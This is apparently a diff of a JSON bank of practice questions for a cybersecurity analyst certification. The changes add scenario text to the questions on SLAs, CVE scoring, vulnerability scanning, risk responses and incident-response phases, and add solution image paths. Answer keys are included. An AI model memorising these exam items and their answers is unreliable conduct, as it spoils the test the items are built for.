       "D": "Navigate to the File menu and select FTP from the Export objects option"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen86.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following documents should the SOC manager review to ensure the team is meeting the appropriate contractual obligations for the customer?",
+    "question": "A SOC manager receives a phone call from an upset customer. The customer received a vulnerability report two hours ago; but the report did not have a follow-up remediation response from an analyst. Which of the following documents should the SOC manager review to ensure the team is meeting the appropriate contractual obligations for the customer?",
     "choices": {
       "A": "SLA",
       "B": "MOU",
@@ -1749,14 +1765,14 @@
       "D": "Limitation of liability"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen87.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following factors would an analyst most likely communicate as the reason for this escalation?",
+    "question": "An older CVE with a vulnerability score of 7.1 was elevated to a score of 9.8 due to a widely available exploit being used to deliver ransomware.\n\nWhich of the following factors would an analyst most likely communicate as the reason for this escalation?",
     "choices": {
       "A": "Scope",
       "B": "Weaponization",
@@ -1764,14 +1780,14 @@
       "D": "Asset value"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen88.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following scanning methods can be implemented to reduce the access to systems while providing the most accurate vulnerability scan results?",
+    "question": "A company is in the process of implementing a vulnerability management program, and there are concerns about granting the security team access to sensitive data.\n\nWhich of the following scanning methods can be implemented to reduce the access to systems while providing the most accurate vulnerability scan results?",
     "choices": {
       "A": "Credentialed network scanning",
       "B": "Passive scanning",
@@ -1779,14 +1795,14 @@
       "D": "Dynamic scanning"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen89.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following scanning methods can be implemented to reduce the access to systems while providing the most accurate vulnerability scan results?",
+    "question": "A company is in the process of implementing a vulnerability management program, and there are concerns about granting the security team access to sensitive data. Which of the following scanning methods can be implemented to reduce the access to systems while providing the most accurate vulnerability scan results?",
     "choices": {
       "A": "Credentialed network scanning",
       "B": "Passive scanning",
@@ -1794,14 +1810,14 @@
       "D": "Dynamic scanning"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen9.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following security controls would best support the company in this scenario?",
+    "question": "There are several reports of sensitive information being disclosed via file sharing services. The company would like to improve its security posture against this threat.\n\nWhich of the following security controls would best support the company in this scenario?",
     "choices": {
       "A": "Implement step-up authentication for administrators",
       "B": "Improve employee training and awareness",
@@ -1809,7 +1825,7 @@
       "D": "Deploy mobile device management"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen90.jpg",
     "image_statement": "",
     "answer": [
       "B"
@@ -1824,7 +1840,7 @@
       "D": "Decide on the color scheme that will effectively communicate the metrics"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen91.jpg",
     "image_statement": "",
     "answer": [
       "A"
@@ -1839,7 +1855,7 @@
       "D": "Decide on the color scheme that will effectively communicate the metrics"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen92.jpg",
     "image_statement": "",
     "answer": [
       "A"
@@ -1854,7 +1870,7 @@
       "D": "OWASP"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen93.jpg",
     "image_statement": "",
     "answer": [
       "C"
@@ -1869,14 +1885,14 @@
       "D": "OWASP"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen94.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following risk management principles did the CISO select?",
+    "question": "After conducting a cybersecurity risk assessment for a new software request, a Chief Information Security Officer (CISO) decided the risk score would be too high. The CISO refused the software request.\n\nWhich of the following risk management principles did the CISO select?",
     "choices": {
       "A": "Avoid",
       "B": "Transfer",
@@ -1884,14 +1900,14 @@
       "D": "Mitigate"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen95.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following risk management principles did the CISO select?",
+    "question": "After conducting a cybersecurity risk assessment for a new software request, a Chief Information Security Officer (CISO) decided the risk score would be too high. The CISO refused the software request. Which of the following risk management principles did the CISO select?",
     "choices": {
       "A": "Avoid",
       "B": "Transfer",
@@ -1899,14 +1915,14 @@
       "D": "Mitigate"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen96.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following steps of the process does this describe?",
+    "question": "An analyst is remediating items associated with a recent incident. The analyst has isolated the vulnerability and is actively removing it from the system. Which of the following steps of the process does this describe?",
     "choices": {
       "A": "Eradication",
       "B": "Recovery",
@@ -1914,14 +1930,14 @@
       "D": "Preparation"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen97.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following will best achieve the goal and maximize results?",
+    "question": "The security operations team is required to consolidate several threat intelligence feeds due to redundant tools and portals.\n\nWhich of the following will best achieve the goal and maximize results?",
     "choices": {
       "A": "Single pane of glass",
       "B": "Single sign-on",
@@ -1929,14 +1945,14 @@
       "D": "Deduplication"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen98.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following steps of the process does this describe?",
+    "question": "An analyst is remediating items associated with a recent incident. The analyst has isolated the vulnerability and is actively removing it from the system.\n\nWhich of the following steps of the process does this describe?",
     "choices": {
       "A": "Eradication",
       "B": "Recovery",
@@ -1944,7 +1960,7 @@
       "D": "Preparation"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen99.jpg",
     "image_statement": "",
     "answer": [
       "A"
